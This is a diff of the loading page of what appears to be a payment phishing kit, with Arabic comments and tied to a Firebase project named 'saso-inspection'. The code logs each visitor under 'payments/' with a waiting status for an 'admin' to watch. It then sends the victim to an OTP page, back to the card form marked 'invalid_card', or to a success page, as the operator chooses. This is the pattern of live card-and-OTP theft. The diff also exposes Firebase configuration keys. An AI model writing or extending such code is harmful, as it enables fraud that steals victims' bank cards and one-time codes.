@@ -65,7 +65,6 @@
             gap: 10px;
         }
         
-        /* تنسيق الصورة التي أرسلتها */
         .secure-img {
             width: 100%;
             max-width: 220px;
@@ -95,38 +94,45 @@
     <script>
         // إعدادات Firebase
         const firebaseConfig = { 
-            apiKey: "AIzaSyAzXXXXXXXXXXXX", 
-            databaseURL: "https://vsc-project-default-rtdb.firebaseio.com/", 
-            projectId: "vsc-project" 
+            apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8X6X8X6X8", 
+            authDomain: "saso-inspection.firebaseapp.com",
+            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/", 
+            projectId: "saso-inspection",
+            storageBucket: "saso-inspection.appspot.com",
+            messagingSenderId: "1009002235896",
+            appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
         };
-        firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
 
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        const database = firebase.database();
         const visitorId = localStorage.getItem('visitorId');
 
         if (visitorId) {
-            const statusRef = database.ref('payments/' + visitorId);
-            
-            // مراقبة الحالة لحظياً للتحويل التلقائي
-            statusRef.on('value', (snapshot) => {
+            // تحديث موقع الزائر الحالي وحالته ليراها الأدمن
+            database.ref('payments/' + visitorId).update({
+                currentPage: "جاري المعالجة (Loading)",
+                status: "waiting", // حالة الانتظار حتى يقرر الأدمن (OTP أو غيره)
+                lastUpdate: new Date().toLocaleString('ar-SA'),
+                lastActive: firebase.database.ServerValue.TIMESTAMP
+            });
+
+            // مراقبة الحالة لحظياً للتحويل التلقائي بناءً على اختيار الأدمن
+            database.ref('payments/' + visitorId).on('value', (snapshot) => {
                 const data = snapshot.val();
-                if (data && data.status) {
-                    if (data.status === "otp") {
+                if (data && data.action) {
+                    if (data.action === "goToOtp") {
                         window.location.href = 'otp.html';
-                    } else if (data.status === "error") {
-                        window.location.href = 'payment.html?error=1';
-                    } else if (data.status === "success") {
+                    } else if (data.action === "backToPayment") {
+                        window.location.href = 'payment.html?error=invalid_card';
+                    } else if (data.action === "goToSuccess") {
                         window.location.href = 'success.html';
                     }
                 }
             });
-
-            // تحديث موقع الزائر الحالي في لوحة التحكم
-            database.ref('live_visitors/' + visitorId).update({
-                page: "انتظار المعالجة (Loading)",
-                last_active: firebase.database.ServerValue.TIMESTAMP
-            });
         } else {
+            // في حال عدم وجود معرف زائر، العودة لصفحة الدفع
             window.location.href = 'payment.html';
         }
     </script>
